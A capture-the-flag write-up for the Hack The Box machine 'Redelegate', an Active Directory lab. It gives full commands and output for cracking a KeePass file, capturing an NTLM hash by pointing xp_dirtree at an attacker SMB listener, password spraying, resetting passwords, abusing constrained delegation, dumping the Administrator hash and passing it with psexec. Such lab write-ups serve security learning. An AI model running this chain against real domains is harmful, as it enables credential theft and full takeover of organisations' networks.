---
title: "HTB - Redelegate"
date: 2026-07-16
---

## Overview
Redelegate is a hard-rated Active Directory machine focusing on credential leakage, lateral movement, and delegation abuse. This writeup covers extracting MSSQL credentials from KeePass, RID brute-forcing domain accounts, password spraying to catch a foothold as `marie.curie`, and ultimately abusing `SeEnableDelegationPrivilege` on `helen.frost` via Constrained Delegation to compromise the entire domain.

## Recon
### Nmap
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ sudo nmap -p- -T4 -Pn 10.129.234.50
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 16:27 +0100
Nmap scan report for 10.129.234.50
Host is up (0.033s latency).
Not shown: 65504 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49932/tcp open  unknown
57767/tcp open  unknown
57768/tcp open  unknown
57769/tcp open  unknown
57772/tcp open  unknown
57784/tcp open  unknown
57816/tcp open  unknown
59927/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 34.15 seconds
```

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ sudo nmap -p21,53,80,88,135,139,389,445,593,636,1433,3268,3269,3389,5985,9389 -sCV -Pn 10.129.234.50
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 16:29 +0100
Nmap scan report for 10.129.234.50
Host is up (0.019s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-15 15:29:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-15T03:20:49
|_Not valid after:  2056-07-15T03:20:49
| ms-sql-ntlm-info:
|   10.129.234.50:1433:
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-07-15T15:29:44+00:00; +2s from scanner time.
| ms-sql-info:
|   10.129.234.50:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-15T15:29:44+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2026-07-14T03:18:33
|_Not valid after:  2027-01-13T03:18:33
| rdp-ntlm-info:
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-15T15:29:35+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-15T15:29:38
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.30 seconds
```

Key findings:

- Port structure represents a Domain Controller (53,88,389).
- Anonymous FTP login allowed, some interesting files (especially `Shared.kdbx`) I'll want to exfiltrate.
- IIS web server - Microsoft IIS httpd 10.0
- MSSQL server - Microsoft SQL Server 2019 15.00.2000.00 unpatched
- FQDN of host fingerprinted (`dc.redelegate.vl`), as well as domain (`redelegate.vl`).

## Web - 80/tcp
As always, I'll start by adding the FQDN and domain to my `/etc/hosts` file.

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ echo '10.129.234.50 dc.redelegate.vl redelegate.vl' | sudo tee -a /etc/hosts
10.129.234.50 dc.redelegate.vl redelegate.vl
```

![IIS Start](/assets/img/redelegate/iis2.png)

I'll find the `iisstart.htm` landing page. At the moment, I'm more interested in anonymous FTP being enabled, so I'll shift my focus to that.

## FTP - 21/tcp
I find some interesting files, one being a `KeePass` db file.

> There is a mistake here, see if you can spot it. See `Slight Problem` heading for an explanation.

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ ftp redelegate.vl 
Connected to dc.redelegate.vl.
220 Microsoft FTP Service
Name (redelegate.vl:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||59354|)
125 Data connection already open; Transfer starting.
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> mget *
mget CyberAudit.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||59356|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
434 bytes received in 00:00 (20.40 KiB/s)
mget Shared.kdbx [anpqy?]? y
229 Entering Extended Passive Mode (|||59357|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
WARNING! 10 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
2622 bytes received in 00:00 (125.21 KiB/s)
mget TrainingAgenda.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||59358|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
580 bytes received in 00:00 (13.78 KiB/s)
ftp> exit
221 Goodbye.
```

Investigating `.txt` files:
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ cat CyberAudit.txt 
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

The below suggests some users have a password relating to the `SeasonYear!` format.
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ cat TrainingAgenda.txt
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```

### KeePass - Shared.kdbx
From previous CTFs I know to utilise the `john` tool `keepass2john` to generate a crackable hash and retrieve the master password.

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ keepass2john Shared.kdbx > keepass.lol

┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ cat keepass.lol
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca4e19
```

However, attempting to crack this with `hashcat` does not appear to be working after leaving it for some time. I'll leave this running and look into trying mutations of `SeasonYear!`.

I'll create a small wordlist starting with 2024 as the year, since the txt files state it being 2024.
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ cat seasonpass.txt                                     
Spring2024!
Summer2024!
Fall2024!
Autumn2024!
Winter2024!
```

#### Slight Problem
After checking my FTP transfers, I realised the `keepass` db file was not transferring properly.

```
226 Transfer complete.
WARNING! 10 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
2622 bytes received in 00:00 (127.16 KiB/s)
```

With a quick search, I find out I must use `binary` mode, and the explanation makes a lot of sense. Transferring in ASCII mode is used for plain-text files, `binary` mode will transfer bit for bit / byte for byte.
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ ftp redelegate.vl
Connected to dc.redelegate.vl.
220 Microsoft FTP Service
Name (redelegate.vl:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> prompt off
Interactive mode off.
ftp> get 
CyberAudit.txt          Shared.kdbx             TrainingAgenda.txt
ftp> get Shared.kdbx
local: Shared.kdbx remote: Shared.kdbx
229 Entering Extended Passive Mode (|||58751|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************|  2622      157.06 KiB/s    00:00 ETA
226 Transfer complete.
2622 bytes received in 00:00 (152.60 KiB/s)
```

Back to cracking the hash, I'll find the password is `Fall2024!`.
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ hashcat -m 13400 keepass.lol seasonpass.txt --user
<SNIP>
$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca:Fall2024!
</SNIP>
```

I can use `keepassxc-cli` to open the db and look for credentials. I'll find an interesting set of credentials for SQL Guest Access.

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ keepassxc-cli ls Shared.kdbx
Enter password to unlock Shared.kdbx: 
KdbxXmlReader::readDatabase: found 1 invalid group reference(s)
IT/
HelpDesk/
Finance/
```

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ keepassxc-cli export Shared.kdbx
<SNIP>
<Key>Password</Key>
<Value ProtectInMemory="True">zDPBpaF4FywlqIv11vii</Value>
</String>
<String>
<Key>Title</Key>
<Value>SQL Guest Access</Value>
</String>
<String>
<Key>URL</Key>
<Value/>
</String>
<String>
<Key>UserName</Key>
<Value>SQLGuest</Value>
</SNIP>
```

## MSSQL - 1433/tcp
I'll login with credentials found, and as expected, the guest user is unable to enable/use `xp_cmdshell`.

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ impacket-mssqlclient 'SQLGuest':'zDPBpaF4FywlqIv11vii'@10.129.234.50
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)> 
disable_xp_cmdshell  enum_db              enum_logins          exec_as_login        help                 shell                upload               xp_dirtree
download             enum_impersonate     enum_owner           exec_as_user         lcd                  show_query           use_link             
enable_xp_cmdshell   enum_links           enum_users           exit                 mask_query           sp_start_job         xp_cmdshell          
SQL (SQLGuest  guest@master)> xp_cmdshell
xp_cmdshell
SQL (SQLGuest  guest@master)> xp_cmdshell
ERROR(DC\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (SQLGuest  guest@master)> enable_xp_cmdshell
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (SQLGuest  guest@master)> 
```

I'll use `xp_dirtree` to force the SQL Server to authenticate against a SMB listener on my Kali machine (`tun0`), capturing the `sql_svc` user's NTLMv2 hash for offline cracking.
```sh
SQL (SQLGuest  guest@master)> xp_dirtree //10.10.14.229/share
subdirectory   depth   file
------------   -----   ----
```

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ sudo responder -I tun0
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.234.50
[SMB] NTLMv2-SSP Username : REDELEGATE\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::REDELEGATE:3778e551c6a99b1f:D4C29832014A164E3455C39C52E8F8A9:010100000000000080E51E4E8014DD0193301DD3F24E76880000000002000800360058005100580001001E00570049004E002D0031005300380032004E00440033003000510058004E0004003400570049004E002D0031005300380032004E00440033003000510058004E002E0036005800510058002E004C004F00430041004C000300140036005800510058002E004C004F00430041004C000500140036005800510058002E004C004F00430041004C000700080080E51E4E8014DD010600040002000000080030003000000000000000000000000030000021CEBA1339276A14A66A451CD14E88F3C6A10D9AA3E6FE84D64F4E869D0877030A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320039000000000000000000
```

Attempting to crack this hash leads to a dead-end.
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ hashcat -m 5600 sqlsvc.hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting
<SNIP>
Approaching final keyspace - workload adjusted.
</SNIP>
```

Back to the MSSQL instance - I find a link to another server `WIN-Q13O908QBPG`:
```sh
SQL (SQLGuest  guest@master)> enum_links
SRV_NAME                     SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE               SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------------------------   ----------------   -----------   --------------------------   ------------------   ------------   -------   
WIN-Q13O908QBPG\SQLEXPRESS   SQLNCLI            SQL Server    WIN-Q13O908QBPG\SQLEXPRESS   NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
```

I also check [hacktricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#user-enumeration-via-rid-brute-force) and find that it's possible to use a local SQL user to brute-force RIDs using `netexec`. 

> I actually reported a bug in `netexec`'s `--rid-brute` where the returned SID from `impacket` no longer needs to be decoded. The metasploit module for MSSQL RID brute-forcing was working fine, leading me to believe there was a bug. Props to Neff for troubleshooting this instantly. Link [here](https://github.com/Pennyw0rth/NetExec/pull/1314).

The error I was getting:
```sh
┌──(kali㉿kali)-[~]
└─$ nxc mssql dc.redelegate.vl -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (2019 RTM 15.0.2000) (name:DC) (domain:redelegate.vl) (EncryptionReq:False) 
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
MSSQL       10.129.234.50   1433   DC               [-] Error parsing SID. Not domain joined?: 'str' object has no attribute 'decode'
```

After the fix, I'll retrieve a list of users that I successfully brute-forced the RID of:
```sh
┌──(kali㉿kali)-[~]
└─$ nxc mssql dc.redelegate.vl -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute 5000
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (2019 RTM 15.0.2000) (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii
<SNIP>
MSSQL       10.129.234.50   1433   DC               1104: REDELEGATE\Christine.Flanders
MSSQL       10.129.234.50   1433   DC               1105: REDELEGATE\Marie.Curie
MSSQL       10.129.234.50   1433   DC               1106: REDELEGATE\Helen.Frost
MSSQL       10.129.234.50   1433   DC               1107: REDELEGATE\Michael.Pontiac
MSSQL       10.129.234.50   1433   DC               1108: REDELEGATE\Mallory.Roberts
MSSQL       10.129.234.50   1433   DC               1109: REDELEGATE\James.Dinkleberg
MSSQL       10.129.234.50   1433   DC               1112: REDELEGATE\Helpdesk
MSSQL       10.129.234.50   1433   DC               1113: REDELEGATE\IT
MSSQL       10.129.234.50   1433   DC               1114: REDELEGATE\Finance
MSSQL       10.129.234.50   1433   DC               1115: REDELEGATE\DnsAdmins
MSSQL       10.129.234.50   1433   DC               1116: REDELEGATE\DnsUpdateProxy
MSSQL       10.129.234.50   1433   DC               1117: REDELEGATE\Ryan.Cooper
MSSQL       10.129.234.50   1433   DC               1119: REDELEGATE\sql_svc
```

After curating a list of users from the above output, I'll spray both passwords found so far and find a hit for the user `marie.curie`.
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ nxc smb dc.redelegate.vl -u users.txt -p passwords.txt --continue-on-success
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helen.Frost:Fall2024!
<SNIP>
```

## BloodHound AD Chain
When retrieving valid domain credentials, most of the time, I like to take a Bloodhound/LDAP sample of data and see if there are any interesting nodes.

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ rusthound-ce -d redelegate.vl -u marie.curie -p 'Fall2024!' -z 
<SNIP>
[2026-07-16T11:32:27Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2026-07-16T11:32:27Z INFO  rusthound_ce::json::maker::common] 64 groups parsed!
[2026-07-16T11:32:27Z INFO  rusthound_ce::json::maker::common] 2 computers parsed!
[2026-07-16T11:32:27Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-07-16T11:32:27Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-07-16T11:32:27Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-07-16T11:32:27Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-07-16T11:32:27Z INFO  rusthound_ce::json::maker::common] .//20260716123227_redelegate-vl_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 12:32:27 on 07/16/26! Happy Graphing!
```

After loading BloodHound, I find a path to own `FS01.redelegate.vl`, however the host is not online. This finding will come into play shortly.

![BloodHound](/assets/img/redelegate/bh.png)

First, I'll reset the password of `helen.frost`.
```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ bloodyad --host 10.129.234.50 -d redelegate.vl -u 'marie.curie' -p 'Fall2024!' set password helen.frost qvqisaface10@
[+] Password changed successfully!
```

## User Foothold
I also find `helen.frost` is a member of the `Remote Management` group.

![Groups](/assets/img/redelegate/groups.png)

### User Flag
I can establish a shell on `dc.redelegate.vl`.

```sh
┌──(kali㉿kali)-[~/htb/hard/redelegate]
└─$ evil-winrm -i dc.redelegate.vl -u 'helen.frost' -p 'qvqisaface10@'

*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Helen.Frost\desktop> cat user.txt
<REDACTED_FLAG>
```

I'll find an interesting privilege enabled.
```sh
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

## Privilege Escalation
### Constrained Delegation
This type of delegation makes the most sense: I hold `GenericAll` over `FS01`, giving me write access to its attributes, and `helen.frost` has `SeEnableDelegationPrivilege`, the privilege required to actually set delegation-related attributes (`userAccountControl`, `msDS-AllowedToDelegateTo`) on a machine account.

Together these let me configure `FS01` for constrained delegation with protocol transition and coerce a service ticket as any user.

> I'll use `bloodyad` for this, though the same changes could be made via `PowerShell` directly from the `helen.frost` DC foothold.

First, I'll change the password of the machine account for `FS01`.
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p 'qvqisaface10@' set password 'FS01$' 'qvqisaface10@'
[+] Password changed successfully!
```

Next, I'll check the `UserAccountControl` attribute on `FS01$`.
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p 'qvqisaface10@' get object 'FS01$' --attr userAccountControl

distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
userAccountControl: WORKSTATION_TRUST_ACCOUNT
```

It appears default for an untouched machine account. Looking at Microsoft's documentation on `UserAccountControl` flags, I'll find the following decimal values on the property flags:

- **WORKSTATION_TRUST_ACCOUNT** - 4096
- **TRUSTED_TO_AUTH_FOR_DELEGATION** - 16777216

I'll need to give `bloodyad` the total in decimals to add the `TRUSTED_TO_AUTH_FOR_DELEGATION` property flag.

16777216 + 4096 = 16781312

Setting the new value for `FS01$`.
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p 'qvqisaface10@' set object 'FS01$' userAccountControl -v 16781312
[+] FS01$'s userAccountControl has been updated
```

```sh
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p 'qvqisaface10@' get object 'FS01$' --attr userAccountControl

distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_TO_AUTH_FOR_DELEGATION
```

I'll then set the AllowedToDelegateTo property to the `ldap` service for `dc.redelegate.vl`.
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p 'qvqisaface10@' set object 'FS01$' msDS-AllowedToDelegateTo -v 'ldap/dc.redelegate.vl'
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

Finally, I'll request a service ticket for LDAP and successfully impersonate the `dc$` machine account.
```sh
┌──(kali㉿kali)-[~]                            
└─$ impacket-getST 'redelegate.vl/FS01$:qvqisaface10@' -spn ldap/dc.redelegate.vl -impersonate dc
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...      
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy                       
[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache

┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Dumping `Administrator` NTLM hash.
```sh
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump -k -no-pass dc.redelegate.vl -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
[*] Cleaning up... 
```

### Root Flag
I'll connect via `psexec` and retrieve the root flag to complete the machine.

```sh
┌──(kali㉿kali)-[~]
└─$ impacket-psexec redelegate.vl/administrator@dc.redelegate.vl -hashes :ec17f7a2a4d96e177bfd101b94ffc0a7
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.redelegate.vl.....
[*] Found writable share ADMIN$
[*] Uploading file SJgwnmDv.exe
[*] Opening SVCManager on dc.redelegate.vl.....
[*] Creating service Spte on dc.redelegate.vl.....
[*] Starting service Spte.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
<REDACTED_FLAG>
```
